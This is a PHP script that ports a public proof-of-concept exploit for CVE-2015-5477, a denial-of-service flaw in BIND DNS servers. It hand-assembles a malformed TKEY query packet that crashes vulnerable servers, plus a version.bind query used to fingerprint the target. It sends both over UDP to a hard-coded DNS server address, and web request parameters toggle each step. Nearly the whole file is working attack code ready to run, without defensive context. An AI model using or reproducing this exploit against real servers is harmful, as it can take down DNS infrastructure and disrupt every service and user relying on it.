<?php
/**
 * Created by IntelliJ IDEA.
 * User: ilanyu
 * Date: 2015/8/18
 * Time: 11:20
 */
$ip = "8.8.8.8"; /* test dns server ip */

$dosPacket = array(
    "\x01", "\x02", /* xid */
    "\x01", "\x00", /* query */
    "\x00", "\x01", /* one question */
    "\x00", "\x00", /* no answer */
    "\x00", "\x00", /* no authorities */
    "\x00", "\x01", /* one additional: must be 'additional' section to work*/

    /* Query name */
    "\x03", 'f', 'o', 'o', "\x03", 'b', 'a', 'r', "\x00",
    "\x00", "\xf9", /* TKEY record type */
    "\x00", "\xff",

    /* Additional record  */
    "\x03", 'f', 'o', 'o', "\x03", 'b', 'a', 'r', "\x00", /* name: must be same as query */
    "\x00", "\x10", /* record type: must NOT be 249/TKEY */
    "\x00", "\xff",
    "\x00", "\x00", "\x00", "\x00",
    "\x00", "\x33",
    "\x32",
    'h', 't', 't', 'p', 's', ':', '/', '/',
    'g', 'i', 't', 'h', 'u', 'b', '.', 'c',
    'o', 'm', '/', 'r', 'o', 'b', 'e', 'r',
    't', 'd', 'a', 'v', 'i', 'd', 'g', 'r',
    'a', 'h', 'a', 'm', '/', 'c', 'v', 'e',
    '-', '2', '0', '1', '5', '-', '5', '4',
    '7', '7'
); /* copy from https://github.com/robertdavidgraham/cve-2015-5477 */

$dosPacket = implode("", $dosPacket);

$versionPacket = array(
    "\x03", "\x04", /* xid */
    "\x01", "\x00", /* query */
    "\x00", "\x01", /* one question */
    "\x00", "\x00", /* no answer */
    "\x00", "\x00", /* no authorities */
    "\x00", "\x00", /* no additional */

    /* Query name */
    "\x07", 'v', 'e', 'r', 's', 'i', 'o', 'n', "\x04", 'b', 'i', 'n', 'd', "\x00",
    "\x00", "\x10", /* TXT */
    "\x00", "\x03",    /* CHOAS */
);  /* copy from https://github.com/robertdavidgraham/cve-2015-5477 */
$versionPacket = implode("", $versionPacket);

$fp = fsockopen("udp://" . $ip, 53, $errno, $errstr, 1);
if (!$fp) {
    echo $errno . ":" . $errstr . "\r\n in" . __LINE__ . "\r\n";
    exit;
}
stream_set_blocking($fp, false);
if (!isset($_GET["noversion"]))
{
    fwrite($fp, $versionPacket);
    sleep(5);
    $res = stream_get_contents($fp);
    echo "version(" . strlen($res) . ")(" . time() . "):" . $res . "\r\n";
}
if (!isset($_GET["nodos"]))
{
    fwrite($fp, $dosPacket);
    sleep(5);
    $res = stream_get_contents($fp);
    echo "dos(" . strlen($res) . ")(" . time() . "):" . $res;
}
fclose($fp);

//$res = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
//$timeout = array('sec' => 1, 'usec' => 0);
//socket_set_option($res, SOL_SOCKET, SO_RCVTIMEO, $timeout);
//socket_bind($res, "0.0.0.0");
//@socket_sendto($res, $versionPacket, strlen($versionPacket), 0, $ip,53);
//@socket_recv($res, $recv, 2048, 0);
//if (empty($recv)) {
//    echo socket_strerror(socket_last_error($res)) . "\r\n";
//}
//else
//{
//    echo $recv . "\r\n";
//}
//socket_sendto($res, $dosPacket, strlen($dosPacket), 0, $ip,53);
//@socket_recv($res, $recv, 2048, 0);
//if (empty($recv)) {
//    echo socket_strerror(socket_last_error($res)) . "\r\n";
//}
//else
//{
//    echo $recv . "\r\n";
//}
//socket_close($res);
//echo "OK-" . time();
